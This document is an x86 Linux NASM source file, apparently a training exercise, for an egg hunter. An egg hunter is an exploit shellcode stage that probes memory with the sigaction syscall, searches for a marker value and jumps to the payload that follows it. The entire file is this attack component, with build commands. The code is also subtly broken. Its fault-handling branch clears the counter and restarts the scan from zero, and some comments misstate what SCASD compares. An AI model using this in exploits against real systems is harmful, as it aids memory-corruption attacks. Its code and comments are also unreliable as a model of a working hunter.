; Egg hunter for the Linux x86 architecture
;  (@_Kiewicz)
; GPL License
; $ nasm -f elf32 egg_hunter.asm -o egg_hunter.o
; $ ld -o egg_hunter egg_hunter.o
; ./egg_hunter

global _start

section .text
_start:

set_page_size:
	xor ecx, ecx	; clearing out ECX
	add cx, 0xfff	; Page size = 4095 (getconf PAGE_SIZE)

go_through:
	inc ecx		; increase ECX by 1 

	xor eax, eax	; clearing out EAX
	mov al, 0x43	; sigaction = 0x43
	int 0x80	; interruptor

	cmp al, 0xf2	; If EFAULT is reached, AL = 0xf2
	jz set_page_size; If EFAULT is reached, go back to top

	mov eax, 0xF5F5F5F5 ; Egg

	mov edi, ecx	; Address of memory into EDI before calling SCASD
	; EDI == ECX?
	scasd		; This compares by 4 bytes
	; If EDI != ECX go to top
	jnz go_through  
	; If True check next 4 bytes...
	scasd
	; If second 4 bytes didnt match go back to top
	jnz go_through 
			
	; If all bytes match...
	jmp edi
